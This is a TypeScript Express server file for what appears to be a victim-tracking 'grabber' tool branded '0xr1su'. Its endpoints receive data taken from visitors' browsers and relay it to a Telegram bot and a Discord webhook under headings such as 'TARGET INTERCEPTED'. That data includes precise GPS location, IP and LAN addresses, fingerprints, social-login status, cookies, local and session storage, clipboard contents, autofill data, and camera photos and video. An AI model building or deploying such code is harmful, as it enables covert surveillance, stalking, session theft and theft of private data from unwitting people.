import { Router } from "express";
import { db, visitsTable } from "@workspace/db";
import { desc } from "drizzle-orm";
import {
  LogVisitBody,
  SendDeviceInfoBody,
  SendPhotoBody,
  SendVideoChunkBody,
} from "@workspace/api-zod";
import { logger } from "../lib/logger";

const router = Router();

// ── User-agent parser ──────────────────────────────────────────────────────

function parseUserAgent(ua: string): { browser: string; os: string; deviceType: string } {
  let browser = "Unknown";
  let os = "Unknown";
  let deviceType = "Desktop";

  if (/mobile|android|iphone|ipad|tablet/i.test(ua)) {
    deviceType = /tablet|ipad/i.test(ua) ? "Tablet" : "Mobile";
  }
  if (/edg\//i.test(ua)) browser = "Edge";
  else if (/chrome/i.test(ua) && !/chromium/i.test(ua)) browser = "Chrome";
  else if (/firefox/i.test(ua)) browser = "Firefox";
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
  else if (/opera|opr/i.test(ua)) browser = "Opera";
  else if (/msie|trident/i.test(ua)) browser = "IE";

  if (/windows/i.test(ua)) os = "Windows";
  else if (/android/i.test(ua)) os = "Android";
  else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
  else if (/mac os x/i.test(ua)) os = "macOS";
  else if (/linux/i.test(ua)) os = "Linux";

  return { browser, os, deviceType };
}

function getClientIp(req: any): string {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) return String(forwarded).split(",")[0].trim();
  return req.ip ?? req.socket?.remoteAddress ?? "Unknown";
}

// ── MarkdownV2 helpers (Telegram) ──────────────────────────────────────────

function esc(s: unknown): string {
  return String(s ?? "").replace(/([_*[\]()~`>#+\-=|{}.!\\])/g, "\\$&");
}
function hdr(emoji: string, title: string): string {
  return `${emoji} *${esc(title)}*`;
}
function bq(lines: string[]): string {
  return lines.filter(Boolean).map(l => `>${l}`).join("\n");
}
function section(emoji: string, title: string, lines: string[]): string {
  const rows = lines.filter(Boolean);
  if (!rows.length) return "";
  return `${hdr(emoji, title)}\n${bq(rows)}`;
}

// ── Telegram helpers ───────────────────────────────────────────────────────

async function tgSend(token: string, chatId: string, text: string): Promise<void> {
  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: "MarkdownV2", disable_web_page_preview: true }),
    });
    if (!res.ok) logger.warn({ status: res.status, body: await res.text().catch(() => "") }, "TG sendMessage failed");
  } catch (err) { logger.warn({ err }, "TG sendMessage error"); }
}

// ── tgMultipart — uses native FormData + Blob (Node 18+) ──────────────────
// Previously used a hand-rolled multipart builder with a Buffer body.
// Undici (Node.js native fetch) does not reliably set Content-Length for
// Buffer bodies, causing Telegram to return 400/connection errors.
// FormData lets Undici handle boundary generation and Content-Length
// automatically — the same way browsers do.

interface TGField {
  name: string;
  value?: string;
  file?: { data: Buffer; filename: string; contentType: string };
}

async function tgMultipart(token: string, method: string, fields: TGField[]): Promise<void> {
  const form = new FormData();
  for (const f of fields) {
    if (f.file) {
      form.append(f.name, new Blob([f.file.data], { type: f.file.contentType }), f.file.filename);
    } else {
      form.append(f.name, f.value ?? "");
    }
  }
  const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: "POST",
    body: form,
  });
  if (!res.ok) logger.warn({ method, status: res.status, body: await res.text().catch(() => "") }, "TG multipart failed");
}

// ── Discord helpers ────────────────────────────────────────────────────────

const DISCORD_COLOR = 0x00e676; // bright green

async function discordSendJSON(webhookUrl: string, payload: object): Promise<void> {
  try {
    const res = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    if (!res.ok) logger.warn({ status: res.status, body: await res.text().catch(() => "") }, "Discord webhook failed");
  } catch (err) { logger.warn({ err }, "Discord webhook error"); }
}

async function discordSendFile(
  webhookUrl: string,
  fileData: Buffer,
  filename: string,
  contentType: string,
  embed: object,
): Promise<void> {
  try {
    const form = new FormData();
    form.append("payload_json", JSON.stringify({ username: "0xr1su", embeds: [embed] }));
    form.append("files[0]", new Blob([fileData], { type: contentType }), filename);
    const res = await fetch(webhookUrl, {
      method: "POST",
      body: form,
    });
    if (!res.ok) logger.warn({ status: res.status, body: await res.text().catch(() => "") }, "Discord file upload failed");
  } catch (err) { logger.warn({ err }, "Discord file error"); }
}

// ── Geocode helper ─────────────────────────────────────────────────────────

async function reverseGeocode(lat: number, lng: number): Promise<{ country: string | null; city: string | null }> {
  try {
    const r = await fetch(
      `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`,
      { headers: { "User-Agent": "VisitorTracker/1.0" }, signal: AbortSignal.timeout(3500) }
    );
    if (r.ok) {
      const geo = await r.json() as any;
      return {
        country: geo.address?.country ?? null,
        city: geo.address?.city ?? geo.address?.town ?? geo.address?.village ?? geo.address?.county ?? null,
      };
    }
  } catch {}
  return { country: null, city: null };
}

// ── Source label helper ────────────────────────────────────────────────────

function sourceEmoji(source: string): string {
  const s = (source ?? "").toLowerCase();
  if (s.includes("facebook")) return "📘";
  if (s.includes("instagram")) return "📷";
  if (s.includes("telegram")) return "✈️";
  if (s.includes("discord")) return "🎮";
  if (s.includes("twitter") || s.includes("x")) return "🐦";
  if (s.includes("tiktok")) return "🎵";
  if (s.includes("youtube")) return "▶️";
  if (s.includes("reddit")) return "🔴";
  if (s.includes("whatsapp")) return "💬";
  if (s.includes("search")) return "🔍";
  if (s.includes("direct")) return "🔗";
  return "🌐";
}

// ── POST /visits ───────────────────────────────────────────────────────────

router.post("/visits", async (req, res) => {
  const parsed = LogVisitBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "Invalid request body" });

  const { latitude, longitude, accuracy, altitude, referrer, source, sourceName } = parsed.data;
  const ua = req.headers["user-agent"] ?? "";
  const { browser, os, deviceType } = parseUserAgent(ua);
  const ip = getClientIp(req);

  let country: string | null = null;
  let city: string | null = null;
  if (latitude != null && longitude != null) {
    const geo = await reverseGeocode(latitude, longitude);
    country = geo.country; city = geo.city;
  }

  const [visit] = await db.insert(visitsTable).values({
    ip, latitude: latitude ?? null, longitude: longitude ?? null,
    accuracy: accuracy ?? null, altitude: altitude ?? null,
    country, city, userAgent: ua || null, browser, os, deviceType,
    referrer: referrer ?? null, source: source ?? null, sourceName: sourceName ?? null,
  }).returning();

  return res.status(201).json({ ...visit, createdAt: visit.createdAt.toISOString() });
});

// ── GET /visits ────────────────────────────────────────────────────────────

router.get("/visits", async (_req, res) => {
  const visits = await db.select().from(visitsTable).orderBy(desc(visitsTable.createdAt));
  return res.json(visits.map(v => ({ ...v, createdAt: v.createdAt.toISOString() })));
});

// ── GET /visits/stats ──────────────────────────────────────────────────────

router.get("/visits/stats", async (_req, res) => {
  const all = await db.select().from(visitsTable).orderBy(desc(visitsTable.createdAt));
  const totalVisits = all.length;
  const uniqueIps = new Set(all.map(v => v.ip).filter(Boolean)).size;
  const withLocation = all.filter(v => v.latitude != null).length;

  const countryMap = new Map<string, number>();
  for (const v of all) { const k = v.country ?? "Unknown"; countryMap.set(k, (countryMap.get(k) ?? 0) + 1); }
  const topCountries = Array.from(countryMap.entries()).sort((a, b) => b[1] - a[1]).slice(0, 5).map(([country, count]) => ({ country, count }));

  const dayMap = new Map<string, number>();
  const now = new Date();
  for (let i = 13; i >= 0; i--) { const d = new Date(now); d.setDate(d.getDate() - i); dayMap.set(d.toISOString().slice(0, 10), 0); }
  for (const v of all) { const day = v.createdAt.toISOString().slice(0, 10); if (dayMap.has(day)) dayMap.set(day, (dayMap.get(day) ?? 0) + 1); }
  const visitsPerDay = Array.from(dayMap.entries()).map(([date, count]) => ({ date, count }));
  const recentVisits = all.slice(0, 10).map(v => ({ ...v, createdAt: v.createdAt.toISOString() }));

  return res.json({ totalVisits, uniqueIps, withLocation, recentVisits, topCountries, visitsPerDay });
});

// ── POST /visits/deviceinfo ────────────────────────────────────────────────

router.post("/visits/deviceinfo", async (req, res) => {
  const parsed = SendDeviceInfoBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "Invalid body" });

  const info = parsed.data as Record<string, unknown>;
  const tgToken = process.env.TELEGRAM_BOT_TOKEN;
  const tgChat  = process.env.TELEGRAM_CHANNEL_ID;
  const dcHook  = process.env.DISCORD_WEBHOOK_URL;

  const ip = getClientIp(req);
  const time = new Date().toLocaleString("en-PH", { timeZone: "Asia/Manila" });

  const lat = info._lat ? Number(info._lat) : null;
  const lng = info._lng ? Number(info._lng) : null;
  const acc = info._accuracy ? Number(info._accuracy) : null;
  const hasGps = lat != null && lng != null && !isNaN(lat) && !isNaN(lng);
  const mapsUrl = hasGps ? `https://www.google.com/maps?q=${lat},${lng}` : null;

  const rawSource = String(info._source ?? "");
  const rawSourceName = String(info._sourceName ?? "");

  let geoCity = "";
  let geoCountry = "";
  if (hasGps) {
    const geo = await reverseGeocode(lat!, lng!);
    geoCity = geo.city ?? "";
    geoCountry = geo.country ?? "";
  }

  const v = (val: unknown) => (val && String(val) !== "unknown" && String(val) !== "?" ? String(val) : null);

  // ══════════════════════════════════════════════════════════
  // Build Telegram MarkdownV2 message
  // ══════════════════════════════════════════════════════════
  if (tgToken && tgChat) {
    const sections: string[] = [];

    // ── Header with source ──────────────────────────────────
    const emoji = sourceEmoji(rawSource);
    let headerLine = `🎯 *${esc("GRAB RESULT")}*`;
    if (rawSource) {
      headerLine += `\n\n${hdr(emoji, rawSource)}`;
      if (rawSourceName) headerLine += `\n${bq([`👤 ${esc(rawSourceName)}`])}`;
    }
    sections.push(headerLine);

    // ── Network ─────────────────────────────────────────────
    const netLines: string[] = [`IP\\: \`${esc(ip)}\``];
    if (hasGps) {
      netLines.push(`LAT\\: \`${esc(lat!.toFixed(6))}\``);
      netLines.push(`LNG\\: \`${esc(lng!.toFixed(6))}\``);
      if (acc != null) netLines.push(`ACC\\: \`${esc(Math.round(acc))}m\``);
      netLines.push(`MAP\\: [Google Maps](${esc(mapsUrl!)})`);
    } else {
      netLines.push(`GPS\\: No location`);
    }
    if (geoCity || geoCountry) netLines.push(`GEO\\: ${esc([geoCity, geoCountry].filter(Boolean).join(", "))}`);
    if (v(info.netType)) {
      let netStr = String(info.netType);
      if (info.netDownlink) netStr += ` • ${info.netDownlink}`;
      if (info.netRtt) netStr += ` • RTT ${info.netRtt}`;
      netLines.push(`NET\\: ${esc(netStr)}`);
    }
    if (v(info.localIPs) && info.localIPs !== "none") netLines.push(`LAN\\: \`${esc(info.localIPs)}\``);
    sections.push(section("🌐", "Network", netLines));

    // ── Display ─────────────────────────────────────────────
    const dispLines: string[] = [];
    if (v(info.screenRes)) dispLines.push(`Screen\\: ${esc(info.screenRes)} @${esc(info.pixelRatio)}x`);
    if (v(info.orientation)) dispLines.push(`Orient\\: ${esc(info.orientation)}`);
    if (info.touchPoints) dispLines.push(`Touch\\: ${esc(info.touchPoints)} points`);
    if (v(info.colorGamut)) dispLines.push(`Gamut\\: ${esc(info.colorGamut)}`);
    if (v(info.refreshRate)) dispLines.push(`Refresh\\: ${esc(info.refreshRate)}`);
    if (info.darkMode) dispLines.push(`Theme\\: ${esc(info.darkMode)}`);
    sections.push(section("🖥", "Display", dispLines));

    // ── Hardware ─────────────────────────────────────────────
    const hwLines: string[] = [];
    if (v(info.memory)) hwLines.push(`RAM\\: ${esc(info.memory)}`);
    if (v(info.cpuCores)) hwLines.push(`CPU\\: ${esc(info.cpuCores)}`);
    if (info.battery) hwLines.push(`Battery\\: ${esc(info.battery)} \\(charging\\: ${esc(info.charging)}\\)`);
    if (v(info.gpu)) hwLines.push(`GPU\\: ${esc(info.gpu)}`);
    if (v(info.gpuVendor) && info.gpuVendor !== info.gpu) hwLines.push(`Vendor\\: ${esc(info.gpuVendor)}`);
    sections.push(section("💾", "Hardware", hwLines));

    // ── Browser ─────────────────────────────────────────────
    const brLines: string[] = [];
    if (info.timezone) brLines.push(`TZ\\: ${esc(info.timezone)}`);
    if (info.languages) brLines.push(`Lang\\: ${esc(info.languages)}`);
    if (info.cookies) brLines.push(`Cookies\\: ${esc(info.cookies)}`);
    if (v(info.canvasFP)) brLines.push(`Canvas FP\\: \`${esc(info.canvasFP)}\``);
    if (v(info.audioFP)) brLines.push(`Audio FP\\: \`${esc(info.audioFP)}\``);
    sections.push(section("🔑", "Browser", brLines));

    // ── Camera & Mic ─────────────────────────────────────────
    const camLines: string[] = [];
    if (info.cameras) camLines.push(`Cameras\\: ${esc(info.cameras)}`);
    if (v(info.camModel) && info.camModel !== "no label") camLines.push(`Model\\: ${esc(info.camModel)}`);
    if (info.mics) camLines.push(`Mics\\: ${esc(info.mics)}`);
    if (v(info.micModel) && info.micModel !== "no label") camLines.push(`Mic\\: ${esc(info.micModel)}`);
    if (info.permCamera) camLines.push(`Cam Perm\\: ${esc(info.permCamera)}`);
    if (info.permMic) camLines.push(`Mic Perm\\: ${esc(info.permMic)}`);
    sections.push(section("📷", "Camera & Mic", camLines));

    sections.push(`⏱ _${esc(time)}_`);

    await tgSend(tgToken, tgChat, sections.filter(Boolean).join("\n\n"));

    // ── Social Recon ─────────────────────────────────────────
    const social = info.social;
    if (social && typeof social === "object" && Object.keys(social).length) {
      const entries = Object.entries(social as Record<string, string>);
      const socialLines = entries.map(([platform, status]) => {
        const isLoggedIn = status.includes("logged in");
        const isSender = status.includes("SENDER");
        const badge = isSender ? "🎯" : isLoggedIn ? "✓" : "✗";
        return `${badge} ${esc(platform)} — ${esc(status)}`;
      });
      const msg = `${hdr("🌍", "Social Recon")}\n${bq(socialLines)}`;
      await tgSend(tgToken, tgChat, msg);
    }

    // ── App Detection ─────────────────────────────────────────
    const apps = info.apps;
    if (apps && typeof apps === "object" && Object.keys(apps).length) {
      const entries = Object.entries(apps as Record<string, string>);
      const installed = entries.filter(([, s]) => s === "installed");
      const rest = entries.filter(([, s]) => s !== "installed");
      const appLines = [...installed, ...rest].map(([app, status]) =>
        `${status === "installed" ? "✓" : "—"} ${esc(app)}`
      );
      await tgSend(tgToken, tgChat, `${hdr("📱", "App Detection")}\n${bq(appLines)}`);
    }

    // ── Browser Storage ───────────────────────────────────────
    const storage = info.storage;
    if (storage && typeof storage === "object") {
      const s = storage as Record<string, string>;
      const parts: string[] = [hdr("🗄", "Browser Storage")];
      parts.push(`${hdr("🍪", "Cookies")}\n${bq([esc(s.cookies || "(No cookies)")])}`);
      parts.push(`${hdr("🗃", "LocalStorage")}\n${bq([esc(s.localStorage || "(Empty)")])}`);
      parts.push(`${hdr("📦", "SessionStorage")}\n${bq([esc(s.sessionStorage || "(Empty)")])}`);
      if (s.indexedDB) parts.push(`${hdr("💿", "IndexedDB")}\n${bq([esc(s.indexedDB)])}`);
      if (s.cacheStorage) parts.push(`${hdr("⚡", "Cache Storage")}\n${bq([esc(s.cacheStorage)])}`);
      if (s.serviceWorkers) parts.push(`${hdr("⚙", "Service Workers")}\n${bq([esc(s.serviceWorkers)])}`);
      await tgSend(tgToken, tgChat, parts.join("\n\n"));
    }

    // ── Clipboard ─────────────────────────────────────────────
    const clipboard = info.clipboard;
    if (clipboard && typeof clipboard === "object") {
      const c = clipboard as Record<string, string>;
      const clipLines: string[] = [];
      if (c.text) clipLines.push(esc(c.text.slice(0, 1000)));
      if (c.selected) clipLines.push(`Selected\\: ${esc(c.selected.slice(0, 500))}`);
      if (clipLines.length) await tgSend(tgToken, tgChat, `${hdr("📋", "Clipboard")}\n${bq(clipLines)}`);
    }

    // ── Autofill ──────────────────────────────────────────────
    const autofill = info.autofill;
    if (autofill && typeof autofill === "object" && Object.keys(autofill).length) {
      const af = autofill as Record<string, string>;
      const afLines = Object.entries(af).map(([k, val]) => `${esc(k)}\\: ${esc(val)}`);
      await tgSend(tgToken, tgChat, `${hdr("📝", "Autofill Data")}\n${bq(afLines)}`);
    }
  }

  // ══════════════════════════════════════════════════════════
  // Discord embed
  // ══════════════════════════════════════════════════════════
  if (dcHook) {
    const sourceTag = rawSource ? `${sourceEmoji(rawSource)} ${rawSource}${rawSourceName ? ` — ${rawSourceName}` : ""}` : "Direct";

    const fields: { name: string; value: string; inline: boolean }[] = [];

    // Source
    fields.push({ name: "📡 Source", value: sourceTag, inline: false });

    // Network
    fields.push({ name: "🌐 IP", value: `\`${ip}\``, inline: true });
    if (hasGps) {
      fields.push({ name: "📍 Coordinates", value: `[${lat!.toFixed(5)}, ${lng!.toFixed(5)}](${mapsUrl})`, inline: true });
      if (acc != null) fields.push({ name: "🎯 Accuracy", value: `${Math.round(acc)}m`, inline: true });
    }
    if (geoCity || geoCountry) {
      fields.push({ name: "🗺 Location", value: [geoCity, geoCountry].filter(Boolean).join(", "), inline: true });
    }
    if (v(info.netType)) {
      let netStr = String(info.netType);
      if (info.netDownlink) netStr += ` · ${info.netDownlink}`;
      if (info.netRtt) netStr += ` · RTT ${info.netRtt}`;
      fields.push({ name: "📶 Network", value: netStr, inline: true });
    }
    if (v(info.localIPs) && info.localIPs !== "none") {
      fields.push({ name: "🏠 LAN IP", value: `\`${info.localIPs}\``, inline: true });
    }

    // Device
    if (v(info.screenRes)) fields.push({ name: "🖥 Screen", value: `${info.screenRes} @${info.pixelRatio}x`, inline: true });
    if (v(info.memory)) fields.push({ name: "💾 RAM", value: String(info.memory), inline: true });
    if (v(info.cpuCores)) fields.push({ name: "⚡ CPU", value: String(info.cpuCores), inline: true });
    if (info.battery) fields.push({ name: "🔋 Battery", value: `${info.battery} (charging: ${info.charging})`, inline: true });
    if (v(info.gpu)) fields.push({ name: "🎮 GPU", value: String(info.gpu), inline: false });

    // Browser
    if (info.timezone) fields.push({ name: "🕐 Timezone", value: String(info.timezone), inline: true });
    if (info.languages) fields.push({ name: "🌍 Languages", value: String(info.languages), inline: true });
    if (v(info.canvasFP)) fields.push({ name: "🔑 Canvas FP", value: `\`${info.canvasFP}\``, inline: true });

    // Camera perms
    if (info.permCamera) fields.push({ name: "📷 Cam Perm", value: String(info.permCamera), inline: true });
    if (info.permMic) fields.push({ name: "🎤 Mic Perm", value: String(info.permMic), inline: true });

    // Map link
    if (hasGps) {
      fields.push({ name: "🗺 Map Link", value: `[Open in Google Maps](${mapsUrl})`, inline: false });
    }

    const embed = {
      title: "🎯 TARGET INTERCEPTED",
      color: DISCORD_COLOR,
      fields: fields.slice(0, 25), // Discord limit
      footer: { text: `0xr1su • ${time}` },
      timestamp: new Date().toISOString(),
    };

    // Send social recon as second embed if available
    const embedList: object[] = [embed];
    const social = info.social as Record<string, string> | undefined;
    if (social && typeof social === "object") {
      const socialValue = Object.entries(social)
        .map(([p, s]) => `${s.includes("logged in") ? (s.includes("SENDER") ? "🎯" : "✓") : "✗"} **${p}** — ${s}`)
        .join("\n");
      if (socialValue.length <= 4096) {
        embedList.push({
          title: "🌍 Social Recon",
          description: socialValue,
          color: DISCORD_COLOR,
        });
      }
    }

    // App detection as third embed
    const apps = info.apps as Record<string, string> | undefined;
    if (apps && typeof apps === "object") {
      const appsValue = Object.entries(apps)
        .map(([name, status]) => `${status === "installed" ? "✅" : "—"} **${name}**`)
        .join("\n");
      if (appsValue.length <= 4096) {
        embedList.push({
          title: "📱 App Detection",
          description: appsValue,
          color: DISCORD_COLOR,
        });
      }
    }

    // Browser storage as fourth embed
    const storage = info.storage as Record<string, string> | undefined;
    if (storage && typeof storage === "object") {
      const storFields: { name: string; value: string; inline: boolean }[] = [
        { name: "🍪 Cookies", value: `\`\`\`\n${(storage.cookies || "(No cookies)").slice(0, 800)}\n\`\`\``, inline: false },
        { name: "🗃 LocalStorage", value: `\`\`\`\n${(storage.localStorage || "(Empty)").slice(0, 800)}\n\`\`\``, inline: false },
        { name: "📦 SessionStorage", value: `\`\`\`\n${(storage.sessionStorage || "(Empty)").slice(0, 800)}\n\`\`\``, inline: false },
      ];
      embedList.push({
        title: "🗄 Browser Storage",
        fields: storFields.slice(0, 5),
        color: DISCORD_COLOR,
      });
    }

    await discordSendJSON(dcHook, { username: "0xr1su", avatar_url: "https://i.imgur.com/4M34hi2.png", embeds: embedList.slice(0, 10) });
  }

  return res.status(200).json({ ok: true });
});

// ── POST /visits/photo ─────────────────────────────────────────────────────

router.post("/visits/photo", async (req, res) => {
  const parsed = SendPhotoBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "Missing photo" });

  const { photo, caption: customCaption } = parsed.data;
  const tgToken = process.env.TELEGRAM_BOT_TOKEN;
  const tgChat  = process.env.TELEGRAM_CHANNEL_ID;
  const dcHook  = process.env.DISCORD_WEBHOOK_URL;
  const time = new Date().toLocaleString("en-PH", { timeZone: "Asia/Manila" });
  const caption = customCaption ?? `📷 Photo — ${time}`;

  // Strip data-URL prefix if present
  const b64 = photo.includes(",") ? photo.split(",")[1] : photo;
  const buffer = Buffer.from(b64, "base64");

  // Telegram
  if (tgToken && tgChat) {
    try {
      await tgMultipart(tgToken, "sendPhoto", [
        { name: "chat_id", value: tgChat },
        { name: "caption", value: caption },
        { name: "photo", file: { data: buffer, filename: "photo.jpg", contentType: "image/jpeg" } },
      ]);
    } catch (err) { logger.warn({ err }, "TG photo failed"); }
  }

  // Discord — send as file attachment with embed
  if (dcHook) {
    const embed = {
      title: "📷 CAMERA SNAPSHOT",
      color: DISCORD_COLOR,
      description: caption,
      image: { url: "attachment://photo.jpg" },
      footer: { text: `0xr1su • ${time}` },
      timestamp: new Date().toISOString(),
    };
    await discordSendFile(dcHook, buffer, "photo.jpg", "image/jpeg", embed);
  }

  return res.status(200).json({ ok: true });
});

// ── POST /visits/videochunk ────────────────────────────────────────────────

router.post("/visits/videochunk", async (req, res) => {
  const parsed = SendVideoChunkBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "Missing chunk" });

  const { chunk, mimeType = "video/webm", index = 0, label = "CAM", isFinal = false } = parsed.data;
  const tgToken = process.env.TELEGRAM_BOT_TOKEN;
  const tgChat  = process.env.TELEGRAM_CHANNEL_ID;
  const dcHook  = process.env.DISCORD_WEBHOOK_URL;
  const time = new Date().toLocaleString("en-PH", { timeZone: "Asia/Manila" });

  const b64 = chunk.includes(",") ? chunk.split(",")[1] : chunk;
  const buffer = Buffer.from(b64, "base64");
  const isMP4 = (mimeType ?? "").toLowerCase().includes("mp4");
  const ext = isMP4 ? "mp4" : "webm";
  const caption = `🎥 ${label} chunk #${index}${isFinal ? " [FINAL]" : ""} — ${time}`;

  // Always use sendDocument for recorded video (both WebM and MP4).
  // sendVideo requires a fully-finalized, streamable MP4 with moov at the
  // front — MediaRecorder produces fragmented MP4 (fMP4) which Telegram
  // rejects with HTTP 400. sendDocument accepts any container without
  // re-encoding, so it reliably delivers both WebM and fMP4 clips.
  if (tgToken && tgChat) {
    try {
      await tgMultipart(tgToken, "sendDocument", [
        { name: "chat_id", value: tgChat },
        { name: "caption", value: caption },
        { name: "document", file: { data: buffer, filename: `clip_${index}.${ext}`, contentType: mimeType ?? "video/webm" } },
      ]);
    } catch (err) { logger.warn({ err }, "TG video failed"); }
  }

  // Discord — send as video attachment with embed
  if (dcHook) {
    const embed = {
      title: `🎥 ${label} RECORDING${isFinal ? " [FINAL]" : ""}`,
      color: DISCORD_COLOR,
      description: `Chunk #${index} • ${isMP4 ? "MP4" : "WebM"}`,
      footer: { text: `0xr1su • ${time}` },
      timestamp: new Date().toISOString(),
    };
    await discordSendFile(dcHook, buffer, `chunk_${index}.${ext}`, mimeType ?? "video/mp4", embed);
  }

  return res.status(200).json({ ok: true });
});

export default router;
